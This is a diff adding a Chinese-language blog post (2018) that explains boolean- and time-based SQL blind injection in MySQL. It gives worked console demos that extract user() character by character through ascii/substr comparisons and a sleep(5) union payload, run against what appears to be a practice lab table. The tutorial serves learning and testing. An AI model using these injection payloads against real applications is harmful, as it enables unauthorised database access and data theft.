@@ -1,0 +1,48 @@
+---
+layout: post
+title:  "SQL盲注"
+date:   2018-01-06 21:41:45 +0800
+categories: [SQL, 盲注]
+---
+
+> 在没有回显，报错的情况下我们要利用一个注入，大致分为这两类：布尔，时间（这里没有将报错归入盲注是我觉得报错还是有错误回显回来的）
+
+1.**基于布尔型的盲注**
+先介绍几个下面可能会用到的函数：
+-	left(str,len) 返回str从左到右的len长度的字符
+-	substr(str,pos,len);
+	mid(str,pos,len);
+    substring(str,pos,len);
+    返回str第pos位向右len长度的字符(mysql里的解释是：substr,mid is a synonym for SUBSTRING)
+-	ascii(char); 
+	ord(char);
+    返回字符的ascii码值
+-	like '';
+	regexp '' 模糊匹配模式
+
+简单的演示
+```mysql
+mysql> select * from users where id=1 and ascii(substr((select user()),1,1)) > 49;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql> select * from users where id=1 and ascii(substr((select user()),1,1)) = 49;
+Empty set (0.00 sec)
+```
+
+2.**基于时间的盲注**
+基于时间的话，主要会利用到这两个函数sleep()和benchmark()配合if使用像下面这样
+```mysql
+mysql> select * from users where id=1 union select 1,1,if(ascii(substr((select user()),1,1)) = 49,0,sleep(5));
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
+|  1 | 1        | 0        |
++----+----------+----------+
+2 rows in set (5.00 sec)
+```
